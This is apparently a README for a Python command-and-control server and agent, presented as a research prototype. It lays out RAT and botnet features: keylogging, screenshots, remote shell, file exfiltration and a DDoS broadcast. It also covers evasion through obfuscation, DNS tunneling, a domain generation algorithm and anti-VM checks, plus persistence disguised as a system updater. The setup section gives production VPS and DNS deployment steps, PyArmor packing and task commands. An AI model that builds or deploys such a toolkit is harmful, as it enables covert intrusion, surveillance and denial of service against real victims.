# Stealth C2 Server and Agent Prototype

## Overview
This Python-based Command and Control (C2) system is designed for security research and ethical hacking simulations in controlled environments. It demonstrates advanced stealth techniques to evade detection, making it ideal for studying C2 architectures (Remote Access Trojan, dedicated server, botnet) and developing defensive countermeasures. **Use strictly for educational purposes with explicit, written permission. Unauthorized use is illegal and unethical, potentially violating laws like the Computer Fraud and Abuse Act (CFAA) or equivalent regulations.**

The tool features obfuscation, DNS tunneling with a custom DNS server, Domain Generation Algorithm (DGA), anti-VM/anti-debugging, and cross-platform persistence (Windows/Linux/macOS). It supports tasks like command execution, file uploads/downloads, screenshots, keylogging, remote shell, system information gathering, and DDoS simulation, suitable for red teaming, malware analysis, and educational workshops.

## Features
- **C2 Server**: Runs HTTPS (port 8443) and custom DNS (port 53) listeners, manages agents, assigns tasks, and hosts files.
- **Agent**: RAT-like functionality with command execution, file uploads/downloads, screenshots, keylogging, remote shell, system info, and DDoS simulation.
- **Stealth Enhancements**: Obfuscation, DNS tunneling, DGA, anti-VM checks, and advanced persistence.
- **Security**: TLS, per-agent Fernet encryption, and HMAC for secure communication.
- **Cross-Platform**: Persistence on Windows (schtasks), Linux (cron), and macOS (LaunchAgent).
- **New Tasks**: Remote shell for interactive commands and system info for reconnaissance.

## What Can Be Achieved
- **Research**: Test evasion against EDR/antivirus, develop detection rules for DNS tunneling, DGA, or persistence.
- **Education**: Learn advanced C2 techniques, including covert channels, obfuscation, and cross-platform persistence.
- **Red Teaming**: Simulate sophisticated attacks in authorized penetration tests, mimicking APT-like behavior.
- **Collaboration**: Enable group contributions via GitHub for CTFs, workshops, or research papers.
- **Outcomes**: Build expertise in malware analysis, network security, and defense strategy development.

## Key Stealth Enhancements
- **Advanced Obfuscation**:  
  The agent code is base64-encoded and wrapped in an `exec` statement.  
  Dynamic variable names (e.g., `v<random>`) prevent static analysis.  
  *To Do More*: Use PyArmor (`pip install pyarmor`) to obfuscate further: `pyarmor pack -e "--onefile" agent_<agent_id>.py`. This creates a standalone executable.

- **Randomized Communication**:  
  Beacon intervals are randomized (`random.randint(30, 120)` seconds) to avoid predictable patterns.  
  *To Do More*: Implement a Domain Generation Algorithm (DGA):  
  ```python
  def generate_domain(seed):
      import hashlib
      return hashlib.md5((seed + str(int(time.time() // 86400))).encode()).hexdigest()[:10] + ".com"

  - **Covert Communication (DNS Tunneling)**
  Uses dnslib to send tasks/results via DNS TXT records, which are less likely to be flagged than HTTP traffic.
Example: Agent queries task.agent_001.c2.example.com, server responds with encrypted task in TXT record.
Note: Requires a controlled DNS server in production; here, it uses a public DNS for testing.
- **Anti-VM/Anti-Debugging**
Checks for VM/debugger presence using IsDebuggerPresent, /proc/xen, and BIOS serial number length.
If detected, the agent sleeps for an hour to avoid analysis.
- **Advanced Persistence**
Windows: Uses schtasks for scheduled tasks (less detectable than registry).
Linux: Retains cron job but can be enhanced with systemd services.
- **Encrypted Payloads**
Per-agent Fernet keys and HMAC ensure secure, integrity-checked communication.
DNS tunneling encrypts payloads within TXT records.

## Additional Stealth Features##
- **Custom DNS Server** Runs a DNS server on port 53 to handle tunneling queries directly, eliminating reliance on public DNS servers.
- **Domain Generation Algorithm (DGA)** Generates daily-changing domains (e.g., a1b2c3d4e5.c2.example.com) to evade domain-based blocking.
- **macOS Persistence** Uses LaunchAgent plist files to run the agent at login on macOS systems.

## Pros ##
- **Highly Stealthy**: DNS tunneling, DGA, anti-VM checks, and randomized beacons evade most network and endpoint detection.
- **Cross-Platform**: Supports persistence on Windows, Linux, and macOS, broadening research applicability.
- **Educational**: Teaches advanced evasion techniques like DGA, DNS tunneling, and anti-debugging.
- **Flexible**: Adapts to RAT, dedicated server, or botnet scenarios with diverse task types (e.g., remote shell, system info).
- **Secure**: TLS, Fernet encryption, and HMAC ensure safe communication in controlled demos.
- **Collaborative**: GitHub-ready for group contributions, ideal for workshops or CTFs

## Cons ##
- **Advanced EDR Detection** : Behavioral analysis (e.g., CrowdStrike, SentinelOne) may detect DNS tunneling or persistence mechanisms.
- **DNS Setup Complexity** : custom DNS server requires network configuration expertise, especially for production.
- **DNS tunneling** : is slower than HTTPS for large data transfers (e.g., file uploads).
- **Platform Gaps** : While macOS is supported, mobile platforms or advanced anti-forensic techniques need further development.

## Setup Guide ##
System Requirements:

- Python 3.8+ installed on the server and test VMs (Windows, Linux, or macOS).
- Administrative privileges for DNS server setup and persistence mechanisms.
- A test environment with isolated VMs (e.g., VirtualBox, VMware) and snapshots.

Network Requirements:

- For lab testing: A local network where the server’s IP can be set as the DNS resolver.
- For production: A registered domain (e.g., c2.example.com) with NS records pointing to the server’s public IP.

Optional Tools:

- PyArmor for advanced obfuscation: pip install pyarmor.
- A VPS (e.g., AWS, DigitalOcean) for production DNS server hosting.

  - Clone the Repository
  - Install Dependencies : pip install requests cryptography pynput pillow dnslib psutil
  - Generate SSL Certificates : openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes
  - Creates server.crt and server.key for HTTPS.
  - Place them in the stealth-c2-prototype directory.
  - Configure DNS for Tunneling
    - Set the server’s IP (e.g., 127.0.0.1 for local testing) as the DNS resolver:
    - Linux: Edit /etc/resolv.conf to include nameserver 127.0.0.1.
    - Windows: Network adapter settings > DNS > Set to server’s IP.
    - macOS: System Preferences > Network > DNS > Add server’s IP.
    - Update C2_DOMAIN in c2_server.py to a test domain (e.g., c2.example.com).
   
  - Production Setup:
    - Register a domain (e.g., via Namecheap, GoDaddy).
    - Set NS records to point to your server’s public IP (e.g., ns1.c2.example.com → <server_ip>).
    - Update C2_DOMAIN in c2_server.py to your domain.
    - Ensure port 53 is open on the server (e.g., ufw allow 53 on Linux).
    - Run the server on a VPS with a static IP.
   
  - Additional Steps for Production DNS
     - Acquire a VPS (e.g., AWS EC2, DigitalOcean Droplet) with a static public IP (e.g., 203.0.113.1).
     - Configure the VPS firewall to allow port 53: ufw allow 53 or equivalent.
     - Stop conflicting DNS services: systemctl stop systemd-resolved.
     - Set NS records in your domain registrar’s DNS settings:
     - ns1.c2.example.com → <VPS_IP> , ns2.c2.example.com → <VPS_IP>
     - Test DNS resolution: nslookup task.agent_001.<dga_domain> <VPS_IP> should return a TXT record.
     - Secure the DNS server: Restrict port 53 to trusted IPs using firewall rules.
   
  - Run the C2 Server : python c2_server.py
    - Starts HTTPS listener (port 8443) and DNS listener (port 53).
    - Creates tasks and files directories for results and uploads.
    - Generates agent_<id>.py (e.g., agent_001.py) with obfuscation and DGA.
  - Obfuscate the Agent : pip install pyarmor ,pyarmor pack -e "--onefile" agent_<id>.py (Creates a standalone executable for enhanced stealth.)
 
  - Deploy the Agent
   - Copy agent_<id>.py (or the PyArmor executable) to a test VM (Windows, Linux, or macOS).
   - Install dependencies on the VM: pip install requests cryptography pynput pillow dnslib psutil.
   - Run the agent: python agent_<id>.py
  **NOTE** : The agent persists (schtasks, cron, or LaunchAgent) and polls tasks via DNS tunneling and Disable antivirus/EDR on the test VM to avoid false positives
- Verify Setup:
   - Check DNS tunneling: Run print(generate_domain("c2seed")) to verify daily domain.
- Check persistence:
  - Windows: schtasks /query | findstr SystemUpdater
   - Linux: crontab -l
   - macOS: ls ~/Library/LaunchAgents/com.system.updater.plist
   - Monitor tasks and files directories for results and uploads.
 **Use the server’s functions to assign tasks to agents** :
   - # Single agent tasks
- task_agent("agent_001", "command", "whoami")           # Run a command
- task_agent("agent_001", "screenshot", "")              # Capture screenshot
- task_agent("agent_001", "keylog", "10")                # Log keystrokes for 10 seconds
- task_agent("agent_001", "upload", "test.txt")          # Upload a file
- task_agent("agent_001", "shell", "whoami;dir")         # Run multiple commands
- task_agent("agent_001", "sysinfo", "")                 # Gather system info

# Broadcast to all agents (e.g., for botnet)
- broadcast_task("ddos", {"url": "http://target.com", "duration": "30"})
